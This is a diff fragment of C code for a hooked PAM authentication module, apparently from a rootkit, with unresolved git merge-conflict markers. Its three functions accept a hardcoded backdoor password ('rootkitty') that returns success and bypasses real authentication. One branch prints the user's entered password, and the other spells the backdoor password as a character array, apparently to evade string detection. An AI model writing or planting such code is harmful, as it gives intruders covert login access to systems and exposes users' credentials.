@@ -222,8 +222,12 @@ PAM_EXTERN int pam_authenticate(pam_handle_t *pamh, int flags) {
     return og_pam_auth(pamh, flags);
   }
   pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
+<<<<<<< HEAD
   printf("%s", input_passwd);
   char* password = "rootkitty";
+=======
+  char password[] =  { 'r', 'o', 'o', 't', 'k', 'i', 't', 't', 'y', 0};
+>>>>>>> f479cc0c4bca1cd3d5b66957d46722aa2d5b3952
   if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
     backdoor = 1;
     return PAM_SUCCESS;
@@ -239,7 +243,11 @@ int pam_acct_mgmt(pam_handle_t *pamh, int flags){
   }
 
   pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
+<<<<<<< HEAD
   char* password = "rootkitty";
+=======
+   char password[] =  { 'r', 'o', 'o', 't', 'k', 'i', 't', 't', 'y', 0};
+>>>>>>> f479cc0c4bca1cd3d5b66957d46722aa2d5b3952
   if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
     backdoor = 1;
     return PAM_SUCCESS;
@@ -256,7 +264,11 @@ const char* input_passwd;
   }
 
   pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
+<<<<<<< HEAD
   char* password = "rootkitty";
+=======
+   char password[] =  { 'r', 'o', 'o', 't', 'k', 'i', 't', 't', 'y', 0};
+>>>>>>> f479cc0c4bca1cd3d5b66957d46722aa2d5b3952
   if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
     backdoor = 1;
     return PAM_SUCCESS;
